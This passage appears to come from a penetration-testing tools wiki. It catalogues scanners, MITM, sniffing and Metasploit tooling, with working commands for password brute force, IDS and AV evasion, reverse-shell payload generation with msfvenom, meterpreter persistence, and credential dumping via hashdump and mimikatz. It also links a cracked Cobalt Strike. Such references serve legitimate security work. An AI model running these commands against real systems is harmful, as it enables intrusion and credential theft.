        * [BurpSuiteHTTPSmuggler](https://github.com/nccgroup/BurpSuiteHTTPSmuggler) - WAF bypass
        * *Scanners*:

            * Active Scan++
            * Additional Scanner Checks
            * Backslash Powered Scanner
            * HTTPoxy Scanner
            * J2EEScan
            * Web Cache Deception Scanner
            
        * Burp-hash
        * Collaborator Everywhere
        * CSP-Bypass
        * Detect Dynamiс JS
        * File Upload Traverser
        * Freddy, Deserialization Bug Finder
        * Headers Analyzer
        * Java Serial Killer
        * PHP Object Injection Check
        * Reflected Parameters
        * Retire.js
        * Reverse Proxy Detector
        * Same Origin Method Execution
        * Session Timeout Test
        * Software Version Reporter
        * UUID Detector
        * WAFDetect

        *Passive extensions with its own output*:

        * CSP Auditor
        * Decoder Improved
        * EsPReSSO
        * Java Deserialization Scanner
        * Paramalyzer
        * WordPress Scanner

        *Passive configurable extensions*:

        * Bypass WAF
        * What-The-WAF
        * CSRF Scanner
        * CSRF Token Tracker OR CSurfer
        * Error Message Checks
        * Random IP Address Header
        * Request Randomizer

        <br>

        *Manual extensions*:

        * Java Serialized Payloads
        * Hackvector

        *Specific extentions*:

        * AuthMatrix (d)
        * Protobuf Decoder (d)
        * Target Redirector (d)
        * WSDL Wizard (d)
        * Wsdler (d)

        *Interesting extensions*:

        * ExifTool Scanner (d)
        * Kerberos Authentication (d)
        * Scan Check Builder (d)

        <br>

        *Converters* (d):

        * [JSON decoder](https://portswigger.net/bappstore/ceed5b1568ba4b92abecce0dff1e1f2c)
        * [Content-Type converter](https://portswigger.net/bappstore/db57ecbe2cb7446292a94aa6181c9278)

        </div>
        </div>

    * [OWASP ZAP proxy](https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project) - (good in automatization) (previously: websockets was better in comparison to burpsuite's) - good to be chained with burpsuite.
    * [w3af](http://w3af.org/) (opensource) - web-application attack and audit framework
    * [retire.js](https://retirejs.github.io/retire.js/) (exists as commandline, chrome/firefox/burp/owasp-zap extensions) - check for the components (on web-site) with known vulnerabilities (vulnerability scanner)
    * [detectify](https://detectify.com/) - a website vulnerability scanner (*PAID*)
    * [v3n0m-Scanner/V3n0M-Scanner](https://github.com/v3n0m-Scanner/V3n0M-Scanner) - popular pentesting scanner in Python3.6 for SQLi/XSS/LFI/RFI and other vulns
    * [skipfish](https://github.com/spinkham/skipfish) - crawler + analyzer (generates a lot of traffic)
    * [OWASP Mantra Security Framework](https://www.owasp.org/index.php/OWASP_Mantra_-_Security_Framework) - a web application security testing framework built on top of a browser.
    * ***[dirsearch](https://github.com/maurosoria/dirsearch)***, ***[crawlbox](https://github.com/abaykan/crawlbox)***, ***Dirbuster***, ... (*FREE*)
    * [dotdotslash](https://github.com/jcesarstef/dotdotslash) - search for directory traversal vulnerabilities
        <br> [dotdotpwn](https://github.com/wireghoul/dotdotpwn) - the directory traversal fuzzer
    * [golismero (github)](https://github.com/golismero/golismero) ([off site](http://www.golismero.com/#download)) - tool trying to incapsulate other tools and report, smth between collaboration and attacking tool
    
    <div class="spoiler"><div class="spoiler-title" style="display: inline-block;">
    <i>some more</i>
    </div><div class="spoiler-text" markdown="1">
    * {:.dummy} [Wapiti](http://wapiti.sourceforge.net/) - the web-application vulnerability scanner (not really maintained now)
    * {:.dummy} [ratproxy](https://code.google.com/archive/p/ratproxy/) - a semi-automated, largely passive web application security audit tool, optimized for an accurate and sensitive detection, and automatic annotation, of potential problems and security-relevant design patterns based on the observation of existing, user-initiated traffic in complex web 2.0 environments. Detects and prioritizes broad classes of security problems, such as dynamic cross-site trust model considerations, script inclusion issues, content serving problems, insufficient XSRF and XSS defenses, and much more.
    * {:.dummy} [Paros](http://sectools.org/tool/paros/) - proxy for assessing web-applications (last release - 2006)
    * {:.dummy} [skipfish](https://code.google.com/archive/p/skipfish/) - an active web application security reconnaissance tool. It prepares an interactive sitemap for the targeted site by carrying out a recursive crawl and dictionary-based probes. The resulting map is then annotated with the output from a number of active (but hopefully non-disruptive) security checks (in short: web-application security scanner)
    </div>
    </div>

    <br>

    CMS scanners:
    
    * [CMSmap](https://github.com/Dionach/CMSmap) - open source CMS scanner that automates the process of detecting security flaws of the most popular CMSs
    * [CMS-Hunter](https://github.com/SecWiki/CMS-Hunter) - CMS vulnerability test case collection
    * [wpscan](https://github.com/wpscanteam/wpscan) - WordPress scanner
        <br> `wpscan --no-banner -t 20 --url http://10.0.0.1/` - basic
        <br> `wpscan --no-banner -t 20 --url http://10.0.0.1/ -e upt` - light, but qualitive scan
        <br> `wpscan --no-banner -t 20 --url http://10.0.0.1/ -e 'u[1-100],ap,at,tt' --log output.txt` - thorough scan
        <br> enumerate users: `wpscan --no-banner -t 20 --url http://10.0.0.1/ -e 'u[1-100]'`
        <br> brute passwords: `wpscan --no-banner -t 50 --url http://10.0.0.1/ -U admin -w rockyou.txt`

    * [droopescan](https://github.com/droope/droopescan) - Drupal, SilverStripe, wordpress
    * [DrupalScan](https://github.com/rverton/DrupalScan) - Drupal scanner
    * [joomscan](https://github.com/rezasp/joomscan) - Joomla scanner
    * [google's Cloud Security Scanner](https://cloud.google.com/security-scanner/) - automatically scans App Engine apps for common vulnerabilities

* ERP (Enterprise Resource Planning) scanners:

    * [Onapsis](https://www.onapsis.com/)
    * [ERPScan](https://erpscan.com/products/erpscan-security-scanner-for-sap/)

* Other scanners:

    * **LDAP**: [BloodHound (github)](https://github.com/BloodHoundAD/BloodHound) - analyze ldap relationships and handy result's view (*FREE*)
    * **NetBIOS** [nbtscan](http://www.unixwiz.net/tools/nbtscan.html) - scans for open NETBIOS nameservers
    * **SMTP**: [***smtp-user-enum***](http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum), ***ismtp*** (kali-tools) - smtp user enumiration and testing tool
        <br> `smtp-user-enum -M VRFY -U usernames.txt -t 10.0.0.2`
    * **SNMP**: ***braa*** (mass snmp scanner), **onesixtyone**, ***snmpwalk***, ***snmp-check*** (kali-tools), ... (*look snmp paragraph*)
    * **VPN**: [The IKE scanner](https://github.com/royhills/ike-scan) - discover and fingerprint IKE hosts (IPsec VPN Servers)
    * Solaris's (maybe unix-compatible) services: **ftp** (port 21): [ftp-user-enum](http://pentestmonkey.net/tools/user-enumeration/ftp-user-enum), **ident** (port 113): [ident-user-enum](http://pentestmonkey.net/tools/user-enumeration/ident-user-enum), **finger** (port 79): [finger-user-enum](http://pentestmonkey.net/tools/user-enumeration/finger-user-enum)

* IoT:

    * [IoTSeeker](https://github.com/rapid7/IoTSeeker) - detect and check factory-default credentials
        <br> `perl iotScanner.pl 1.1.1.1-1.1.4.254,2.1.1.1-2.2.3.254`

<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->

<br>

---

## Collaboration systems

---

[Системы обработки данных при проведении тестирования на проникновение (RU)](https://habrahabr.ru/company/pentestit/blog/283056/)

* [lair framework](https://github.com/lair-framework/lair) - looks really good with all core features, the project is not really mature, and there is some drawbacks, however they are not significant. The bad is: project does not look like been maintained now ([introducing lair](https://www.youtube.com/watch?v=71Hix58keCU))
* [ArachniScanner](http://www.arachni-scanner.com/) - collaboration tool for various web-application security scans
* [FaradaySEC](https://www.faradaysec.com/) ([faraday (github)](https://github.com/infobyte/faraday)) - not really user-friendly, some core features is not supported, talking to developers are useless, their answers looks like evil mockery, anyway this looks like the most mature solution on the market today (faraday can import lots of varous tool's reports)
* [Dradis](https://dradisframework.com/) (installed by default at kali linux)
* [Serpico](https://github.com/SerpicoProject/Serpico)
* [MagicTree](https://www.gremwell.com/what_is_magictree) - import/export nmap, nessus data

Google-docs analogue:

* [trello](https://trello.com/)
* [onlyoffice](https://www.onlyoffice.com/) - looks almost like google-docs, but with storing information at your own server (better install it from docker hub)
    <br> (comparing to google has only one single drawback: there is no feature of TOC (Table of contence) autoconstruction and handy TOC navigation)
* [etherpad](http://etherpad.org/) - lightweight, like online notepad for your team, handy 'color' feature

<br>

* [Code Dx](https://codedx.com/) - collaboration tool for vulnerabilities, targeted at analysation with source codes. Not for pentersters, but very good for infosec specialists at company, who analyze their own software and deliver vulnerability findings to developer using integration with JIRA.
* [Checkmarx](https://www.checkmarx.com/) - code analysis with ability to be intergrated into SDLC.

<br>

* [KeepNote](http://keepnote.org/) - crossplatform and handy to save your own notes (single user by design)
    <br> can save screenshots, plugins can import data from nmap's XML format, ...

<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->

<br>

---

## Network

---

<!-- uRPF - Unicast Reverse Path Forwarding -->

Special subnets: Martian packets: [reservered IP addresses](https://en.wikipedia.org/wiki/Reserved_IP_addresses)

Typical pentest workflow: host detection -> port scanning -> service's/OS's detection -> vulnerabilities detection (e.g. nmap scripts)

Well known ports: [Ports info (speedguide)](http://www.speedguide.net/ports.php), [wikipedia](http://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers)

<div class="spoiler"><div class="spoiler-title">
<i>ip netmasks cheatsheet</i>
</div><div class="spoiler-text" markdown="1">
![]({{ "/resources/netmasks.png" | prepend: site.baseurl }}){:width="1000px"}
</div></div>

<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->

<br>

### Network scanners

---

***Metasploit** can store everything it founds into its database: db_nmap, hosts, services, creds, loot.* (`workspace myWorkspace`)

* **arp-protocol scan** (discover hosts):

    arp scanning will discover not only hosts in current network, but also other machine's interfaces which belongs to other's networks, because most OS will answer to arp request on all their interfaces

    *   [arp-scan](https://github.com/royhills/arp-scan) - scan existing hosts using arp-scan

        ``` bash
        arp-scan -l -I eth0
        arp-scan --interface=eth0 192.168.0.0/24 | grep 192.168.0.2
        arp-scan --localnet
        ```
        
        <!-- `sudo arp-scan -l -I eth0 | grep "VMware" | awk '{print $1}' | xargs sudo nmap -sV` -->

    * [netdiscover](https://github.com/alexxy/netdiscover) - discover hosts using arp-requests
        <br> can be *passive* (`netdiscover -c 2 -p -P -i eth0`) (only listens to broadcast arps) or active. Netdiscover guesses hardware by mac-address (nmap too).
        <br> active: `netdiscover -c 2 -P -i eth0 -r 10.0.2.0/24`
    * ***arping*** - `arping -c 1 -R/r 10.0.0.2` (can not scan subnet, write script for this purpose)
    * ***metasploit*** module `auxiliary/scanner/discovery/arp-sweep`

*   **port scan**:

    *   [nmap](https://nmap.org/) - utility for network discovery and security auditing. [zenmap](https://nmap.org/zenmap/) - nmap with GUI
        <br> [nmap cheatsheet](http://cs.lewisu.edu/~klumpra/camssem2015/nmapcheatsheet1.pdf)
        <br> [pentest-wiki, ports](https://github.com/nixawk/pentest-wiki/blob/master/3.Exploitation-Tools/Network-Exploitation/ports_number.md)

        {% include_relative /fragments/nmap-cheatsheet.md %}

        <div class="spoiler">
        <div class="spoiler-title" markdown="1">
        ***network IDS/IPS bypass***
        </div>
        <div class="spoiler-text" markdown="1">

        * signature attack (change your traffic)
        * attack the system

            * IP-packet fragmentation `nmap -v -f --mtu 8 -sS ...`
            * Timeout building up TCP segments
            * Using fictitious hosts `nmap -v -D 1.2.3.4,1.2.3.5,asdf.com,1.2.3.6 ...`
            * Change source port `nmap -v -g 445 ...`
            * DoS
            * Changing TTL (first packet will reach the host; second will reach IDS, but not host; third packet will reach the host)
            * ...

        [fragroute](https://www.monkey.org/~dugsong/fragroute/) - utility for bypassing IDS/IPS
        <br> google more, when needed ...

        </div>
        </div>

    * [powershell - built-in port scanner (pentest poster) (SANS)](https://pen-testing.sans.org/blog/2017/03/08/pen-test-poster-white-board-powershell-built-in-port-scanner)

    * ***hping3*** is very powerfull

        syn scan - `hping3 --flood -S 10.0.0.2 -p ++80 -c 5`

        send custom packets: `hping3>` `while {1} { hping send "ip(saddr=10.1.2.3,daddr=10.0.0.2)+tcp(sport=4231,dport=80,flags=s)" }` (TCL lang)

    * Ping-scan using command-line tools:

        windows: `FOR /L %i IN (1,1,254) DO ping -n 1 10.0.0.%i | FIND /i "Reply" >>C:\temp\ipaddresses.txt`
        <br> linux: `for i in {1..254}; do ping -c 1 10.0.0.$i | grep 'from'; done`

    * [sparta](https://tools.kali.org/information-gathering/sparta) - scan network and launch some automated scans against targets (e.g. nikto) + "any tool that can be run from a terminal" against specific host/service

    * [zmap](https://github.com/zmap/zmap) - utility to multithreaded scan of internet's fixed port. <br>
        [ZMap Project (zmap.io)](https://zmap.io/) - a lot of tools for internet manipulating/scanning (the ZMap Project is a collection of open source tools that enable researchers to perform large-scale studies of the hosts and services that compose the public Internet)
        <small>(ZMap, ZGrab, ZDNS, ZTag, ZBrowse, ZCrypto, ZLint, ZIterate, ZBlacklist, ZSchema, ZCertificate, ZTee)</small>

    * [masscan](https://github.com/robertdavidgraham/masscan) - TCP port scanner, spews SYN packets asynchronously, scanning entire Internet in under 5 minutes.
    * [sfan5/fi6s](https://github.com/sfan5/fi6s) - IPv6 port scanner
    * [unicorn](http://sectools.org/tool/unicornscan/) ([kalilinuxtutorials.com](http://kalilinuxtutorials.com/unicornscan/)) - yet another utility for port-scanning (also looks multithreaded)
    
    <div class="spoiler"><div class="spoiler-title" markdown="1">
    *for those, whose religion does not allow to use **nmap***
    </div><div class="spoiler-text" markdown="1">

    * [IP-tools](http://www.softportal.com/software-6039-ip-tools.html)
    * [Angry IP Scanner](http://angryip.org/)
    * [SuperScan](https://www.mcafee.com/ru/downloads/free-tools/superscan.aspx)
    * [SoftPerfect NetScan](https://www.softperfect.com/products/networkscanner/)
    * [ipscan23](http://api.256file.com/ipscan23.exe/en-download-132565.html)
    </div></div>

*   **arbitrary scan**:

    ***hping3*** is a very powerfull tool for sending almost arbitrary tcp/ip packets

    *   using IPID amount of servers beside balancer can be found (e.g. `hping3 -c 10 -i 1 -p 80 -S beta.search.microsoft.com.`: )
        <br> `46 bytes from 207.46.197.115: flags=RA seq=4 ttl=56 id=18588 win=0 rtt=21.2 ms`
        <br> `46 bytes from 207.46.197.115: flags=SA seq=5 ttl=56 id=57741 win=16616 rtt=21.2 ms`
    *   detect firewall rules (by sending various packets and monitoring IPID changes)
    *   detect host's OS (different os generates IPID differently) (nmap does this)

<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->

<br>

### network sniffing

---

* [wireshark](https://www.wireshark.org/) - traffic capture and analysis
* ***tcpdump*** - linux traffic sniffer
    <br> `tcpdump -i any -s 0 -w dump.pcap`
    <br> [tcpdump (microolap)](https://www.microolap.com/products/network/tcpdump/) - tcpdump under windows
* [NetworkMiner](http://www.netresec.com/?page=NetworkMiner) (windows) – network forensic analysis tool (NFAT)
* [Intercepter-ng](http://sniff.su/wiki/index.html) (windows)
* ***hcidump*** - reads raw HCI data coming from and going to a Bluetooth device
* {:.dummy} [netool](https://sourceforge.net/p/netoolsh/wiki/netool.sh%20script%20project/) – automate frameworks like Nmap, Driftnet, Sslstrip, Metasploit and Ettercap MitM attacks

<br>

* [PacketTotal](https://www.packettotal.com/) - pcap analysis engine + show most popular uploaded pcap's (usually with some malware)

<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->

<br>

### attacking network/routers/protocols

---

* ***hping3*** – send (almost) *arbitrary* TCP/IP packets to network hosts (can be user for DoS purpose)
* [***routersploit***](https://github.com/reverse-shell/routersploit) - router exploitation framework
* **Honepot-like tools**:

    * ***[responder (kali)](https://github.com/SpiderLabs/Responder)*** - a LLMNR, NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication
        <br> easy choice: `responder -I eth0 -fwv`
    * ***[yersinia](http://www.yersinia.net/)*** - network tool designed to take advantage of some weakeness in different network protocols (cdp, dhcp, dot1q, dot1x, dtp, hsrp, isl, mpls, stp, vtp)
    * ***[CDPSnarf (kali)](https://tools.kali.org/information-gathering/cdpsnarf)*** - listens for broadcast CDP packets

* [ciscot7](https://github.com/theevilbit/ciscot7) - Cisco Type 7 Password Decrypter
    <br> (type 0 - plaintext, 7 - use ciscot7 (vigenere?), 5 - md5, 4 - sha256)
* {:.dummy} [ip-tools](https://www.ks-soft.net/ip-tools.rus/index.htm) - collection of utilities to work with network under windows

<br>

* [Vladimir-Ivanov-Git/raw-packet](https://github.com/Vladimir-Ivanov-Git/raw-packet) - DHCP attacking tool (IP pool starvation, rogue DHCP server, detect and attack apple devices (change their ip-addresses, default gateway, DNS), CVE-2017-14493 and CVE-2017-14494.)

<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->

<br>

### MITM

---

* *MITM - Man-in-the-middle*

    * [dns-mitm](https://github.com/SySS-Research/dns-mitm) - a fake DNS server that answers requests for a domain's A record with a custom IP address

    hacker-friendly tool for MITM:

    * [bettercap](https://www.bettercap.org/docs/intro.html) - powerful tool created to perform various types of MITM attacks against a network
        <br> ([ssl stripping and hsts bypass](https://www.bettercap.org/blog/sslstripping-and-hsts-bypass/)), ([Инструкция по использованию Bettercap (RU)](https://hackware.ru/?p=1100)), ...
        <br> `bettercap -S ARP --full-duplex --proxy --proxy-https -T 10.0.0.2`
    * [intercepter-ng](http://sniff.su/download.html)
    
    To make everything manually:

    * **arpspoof**

    SSL attacking:

    * **sslstrip** - http->https redirection interception

        * using *arpspoof*
        * `echo 1 > /proc/sys/net/ipv4/ip_forward` - for packet transition
        * `iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT –to-port 1717` - for packets redirection on ssl-stip listening port

    * **sslsplit** - transparent SSL/TLS interception
    * ***sslsniff*** - ??

    Complex tools:

    * [evilfoca](https://n0where.net/network-security-testing-evil-foca) (MITM, DOS, DNS hijacking) (IPv4 / IPv6)
    * [ettercap](https://ettercap.github.io/ettercap/) ([Man in the Middle/Wired/ARP Poisoning with Ettercap](https://charlesreid1.com/wiki/Man_in_the_Middle/Wired/ARP_Poisoning_with_Ettercap))
        <br> (arp-spoofing + password extraction from http, ftp, imap, nfs, ...)
    * [evilgrade](https://github.com/infobyte/evilgrade) - a modular framework that allows the user to take advantage of poor upgrade implementations
        <br> can be used in pair with metasploit, listening for backconnects by payloads loaded by evilgrade
    * ***[mitmf](https://github.com/byt3bl33d3r/MITMf/wiki/Installation)*** (includes integration with responder, BeEF, ...)
    * other mitm tools: ***intercepter-ng***
    * **`mitmproxy`** - is a console tool that allows interactive examination and modification of HTTP traffic.
        <br> `mitmproxy -T --host --insecure` - ???
        <br> **`mitmdump`** - provides tcpdump-like functionality to let you view, record, and programmatically transform HTTP traffic.

<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->

<br>

### SNMP (ports 161/udp, 162/udp)

---

*check for snmp scanners section: [security scanners]({{ "/infosec/tools.html#security-scanners" | prepend: site.baseurl }})*

SNMP design: *SNMP agent <-> SNMP manager <-> MIB database*

Tools:

* ***snmpwalk***
    <br> `snmpwalk -c public -v1 10.0.0.2`
    <br> `snmpwalk -v 3 -l noAuthNoPriv -u admin 10.0.0.2`
    <br> `snmpwalk -v 3 -u admin -a MD5 -A password -l noAuthNoPriv 10.0.0.2 iso.3.6.1.2.1.1.1.0`
* ***snmp-check*** - `snmp-check -c public 127.0.0.1`
* msfconsole - `search snmp`

SNMPv3: [snmpwn](https://github.com/hatlord/snmpwn) - snmpv3 user enumerator and attack tool
<br> `snmpwn --hosts /root/hosts.txt --users=/root/users.txt --passlist=/root/passlist.txt --enclist=/root/passlist`

SNMP spoofing: [nccgroup/cisco-snmp-slap](https://github.com/nccgroup/cisco-snmp-slap) - bypass Cisco ACL (firewall) rules

<!-- 
Lectures about snmp !!!:

* [network protocols: SNMP (intro) (youtube)](https://www.youtube.com/watch?v=8WtqD1Du_IY)
* [network protocols: SNMP (обход правил фаерволла) (youtube)](https://www.youtube.com/watch?v=v5CFtlUs-NY)
* [network protocols: SNMP (snmp version 3) (youtube)](https://www.youtube.com/watch?v=EnhC5sE2D8o)
 -->

<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->

<br>

### wireless (SIM, RFID, Radio)

* [SIMTester](https://opensource.srlabs.de/projects/simtester) - sim-card tests for various vulnerabilities
* [Proxmark3](https://github.com/Proxmark/proxmark3/wiki) – a powerful general purpose RFID tool, the size of a deck of cards, designed to snoop, listen and emulate everything from Low Frequency (125kHz) to High Frequency (13.56MHz) tags
* [GNU Radio](https://www.gnuradio.org/) - toolkit for software radio

<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->

<br>

### other tools

* [ds_store](https://github.com/gehaxelt/ds_store) - Minimal parser for .DS_Store files in golang
* [lyncsmash](https://github.com/nyxgeek/lyncsmash) (Lync/Skype for business) - enumerate users via auth timing bug while brute forcing, lock accounts, locate lync installs

<br>

* [p0fv3](http://lcamtuf.coredump.cx/p0f3/) - tool that utilizes an array of sophisticated, purely passive traffic *fingerprinting* mechanisms to identify endpoints (OS)
* [PCredz](https://github.com/lgandx/PCredz) - This tool extracts Credit card numbers, NTLM(DCE-RPC, HTTP, SQL, LDAP, etc), Kerberos (AS-REQ Pre-Auth etype 23), HTTP Basic, SNMP, POP, SMTP, FTP, IMAP, etc from a pcap file or from a live interface.
* [Cain & Abel](http://www.oxid.it/cain.html) - [docs](http://www.oxid.it/ca_um/) – can recover passwords by sniffing the network, cracking encrypted passwords using dictionary, bruteforce and cryptanalysis attacks, recording VoIP conversations, decoding scrambled passwords, revealing password boxes, uncovering cached passwords and analyzing routing protocols
* [***scapy***](http://www.secdev.org/projects/scapy/) ([scapy (github)](https://github.com/secdev/scapy)) - powerfull interactive packet manipulation program, written in python ([tutor](http://www.secdev.org/projects/scapy/doc/usage.html#interactive-tutorial))
    <br> [kamene](https://github.com/phaethon/kamene/) - network packet and pcap file crafting/sniffing/manipulation/visualization security tool (scapy fork + python3 support)
* [Sparta](http://sparta.secforce.com/) (network infrastructure penetration testing tool) - sparta controls other tools like nmap, hydra, nikto, etc. (simplify network penetration testing)

ACL/configuration analysis/monitor and more:

* [Cisco Prime](https://www.cisco.com/c/en/us/products/cloud-systems-management/prime.html)
* [algosec](https://www.algosec.com/)

<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->
<!-- =================================================================================================================================================================================== -->

<br>

---

## Privilege Escalation / PostExploitation (Linux / Windows)

---

* ***[pwnwiki.io](http://pwnwiki.io) (awesomeness) ([github source](https://github.com/pwnwiki/pwnwiki.github.io))*** - a collection TTPs (tools, tactics, and procedures) for what to do after access has been gained (postexploitation, privilege escalation, etc.)

*   [***Metasploit***](https://www.metasploit.com/)

    GUI:

    * [armitage](https://www.offensive-security.com/metasploit-unleashed/armitage/) - GUI steroids for metasploit (NOT maintained)
    * [cobaltstrike](https://www.cobaltstrike.com/features) - smth like gui for metasploit + some additional exploits
        <br> [AggressorScripts](https://github.com/harleyQu1nn/AggressorScripts) - collection of Aggressor scripts for Cobalt Strike 3.0+ pulled from multiple sources
        <br> [CobaltStrike-ToolKit](https://github.com/killswitch-GUI/CobaltStrike-ToolKit) - some useful scripts for CobaltStrike
        <br> [cobaltstrike-crack (v2.5)](https://github.com/nilotpalbiswas/cobaltstrike-crack)
        <!-- <br> It looks like it is very easy to crack cobaltstrike-trial (just change expiration time in license.java). -->
        <!-- <br> [Getting started with cobalt strike](https://1337red.wordpress.com/getting-started-with-cobalt-strike/) -->

    *   [Metasploit unleashed](https://www.offensive-security.com/metasploit-unleashed/) (you can also try to download "metasploit unleashed" book)

        [Using the Database in Metasploit](https://www.offensive-security.com/metasploit-unleashed/using-databases/)

        msfrpcd -U msf -P msfpass -f

        `msf> search [regexp]` - regexp???

        ``` bash
        bash> service postgresql start
        bash> msfdb init
        bash> msfconsole
        msf> db_status
        msf> db_rebuild_cache
        msf> reload / loot / services / ...
        msf> help / db_status / show –h / set
        ```

        ```
        msf> set verbose true
        msf> show -h
        msf> show options
        msf> show advanced
        msf> set
        msf> show missing
        ```

        ```
        msf> jobs -l
        msf> sessions -l
        meterpreter> <Ctrl+Z> # background current interactive session
        ```

        * `auxiliary`

            * port scanner: `use auxiliary/scanner/portscan/tcp`
            * dns enumeration: `use auxiliary/gather/dns_enum`
            * ftp server: `use auxiliary/server/ftp` `set FTPROOT /tmp/ftproot` `run`
            * socks proxy server: `use auxiliary/server/socks4`

        *   [meterpreter](http://www.offensive-security.com/metasploit-unleashed/Meterpreter_Basics) ([some meterpreter scripts for windows exploitation](https://github.com/darkoperator/Meterpreter-Scripts)), usage:
        
            1. using `msfvenom` for payload generation, e.g. `msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.0.0.1 lport=12344 -f exe > r.exe`
            2. moving payload to victim and execute it
            3. msfconsole: `use exploit/multi/handler`
                <br> eternal handler: `set exitonsession false` -> `run -j`
            4. set variables `PAYLOAD`, `LHOST`, `LPORT`
            5. `> exploit` -> opens meterpreter (in effect - remote shell)

            * fast migration:
                `meterpreter > ps | grep spool` -> `meterpreter > migrate 1100`
            * `run persistence -h` - set meterpreter into autostart (registry), `metsvc` - set meterpreter as a service with autostart
            * `> sysinfo / getuid / getsid / getprivs / ps / migrate / use priv / getsystem / run winenum / shell / shutdown / reboot / load mimikatz + wdigest / ...`
                <br> `kill / execute` - you can do a lot of things, ..., install keylogger, make screenshots, getcountermeasure, ...
            * file manipulations: `download / upload / cat / edit` `ls/pwd/cd/lcd/mkdir/rmdir`
            * network: `ipconfig / portfwd / route`
            * `loot`

            * ***privilege escalation***

                * `getsystem` - elevate privileges to localsystem
                * retrieve credentials:
                    
                    * `hashdump` - dumps the contence of SAM database
                    * `load mimikatz`
                    
                        * `kerberos`
                        * `livessp`, `ssp`
                        * `wdigest`
                        * `mimikatz_command -f samdump::hashes`
                        * `mimikatz_command -f sekurlsa::searchPasswords`

                * `steal_token [user PID]` - steal user's token
                *   token impersonalization:

                    ```
                    use incognito
                    list_tokens -u
                    impersonate_token DOMAIN\user
                    ```

                * attempt to create user on a domain controller: `add_user phonexicum qwerty123456 -h 192.168.20.30`
                * pivote into other systems:

                    ```
                    meterpreter> run get_local_subnets
                    meterpreter> background
                    msf exploit(handler)> route add <localsubnet> <netmask> [session] run
                    ```
                * list all post modules: `run [TAB] [TAB]`

    *   [msfvenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/) shellcode/payload generator
        <br> fast example: `msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=12344 -f c --platform windows -a x86 -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -i 5`

        * [ShellcodeWrapper](https://github.com/Arno0x/ShellcodeWrapper) - mutlibyte XOR or AES encrypted shellcode

        <br>
        msfvenom help:

        ``` bash
        msfvenom --help-formats # list supported output formats
        msfvenom --help-platforms # list supported platforms
        msfvenom -l payloads|encoders|nops|all # list available payloads|encoders|nops|all
            ## best encoder is usually `x86/shikata_ga_nai`
            ## for payloads search better use msfconsole for search and selection
        msfvenom -p [payload] --payload-options # check payload options

        ## --smallest - generate the smallest possible payload
        msfvenom -k -x cmd.exe # specify a custom executable file to use as a template
            ## -k - preserve the template’s normal behaviour and run payload as a separate thread
            ## built-in templates: `/usr/share/metasploit-framework/data/templates`
        ```

        * `-x` flag helps to avoid AV detection
        *   main encoder's purpose is to avoid bad chars, however chaining various encoders can help to bypass AV

            ```
            msfvenom -p windows/shell_reverse_tcp LHOST=172.16.0.250 LPORT=12346 -f exe -a x86 --platform windows -b "\x00\x0a\x0d" -i 15 -e x86/shikata_ga_nai -f raw | \
            msfvenom -a x86 --platform windows -e x86/countdown -i 17  -f raw | \
            msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 12  -f exe >shell_reverse_tcp2.exe
            ```

        Connecting with meterpreter:

        ``` bash
        msf> use exploit/multi/handler
        msf> set payload windows/meterpreter/reverse_tcp
        msf> set lhost 10.0.0.1
        msf> set lport 12344
        msf> exploit -j # -j option is to keep all the connected sessions in the background
        ```

        msfvenom encoders can be chained, e.g.:

        ``` bash
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=12344 -f raw -e x86/shikata_ga_nai -i 3 | \
        msfvenom -a x86 --platform windows -e x86/countdown -i 5  -f raw | \
        msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 8 -f exe -o payload.exe
        ```

    * [msfpc](https://github.com/g0tmi1k/mpc) - msfvenom payload creator (user-friendly msfvenom wrapper)
    * [TheFatRat](https://github.com/Screetsec/TheFatRat) - massive exploiting tool targeted at Windows exploitation - *very user-friendly* (looks like instrument is just using metasploit, Veil, ..., but no additional technics in it) ([usage example](http://www.yeahhub.com/generate-100-fud-backdoor-thefatrat-windows-10-exploitation/))


    * **Autopwn**
        
        *   ***metasploit's db_autopwn*** ([video sample](https://www.youtube.com/watch?v=V-JBUXtuV0Q))
            <br> installation: `wget https://raw.githubusercontent.com/hahwul/metasploit-db_autopwn/master/db_autopwn.rb -P /usr/share/metasploit-framework/plugins/`
            <br> Check at lines 412, 414, 428, 430 selected payloads (better change it to x64) or there can be some problems.

            ```
            msfconsole

            msf > workspace -a lab1
            msf > # workspace -d lab1

            msf > db_import file.xml # nmap xml, nessus xml, acunetix, ...
            msf > db_nmap … # same command to nmap

            msf > hosts -h
            msf > services -h
            msf > creds -h

            msf > db_export -f xml /path/to/file.xml

            msf > load db_autopwn
            msf > db_autopwn -t -p -e -R 0 -r
                # -r - reverse shell
                # -b - bind shell
                # -v - verbose
            msf > sessions -l
            ```

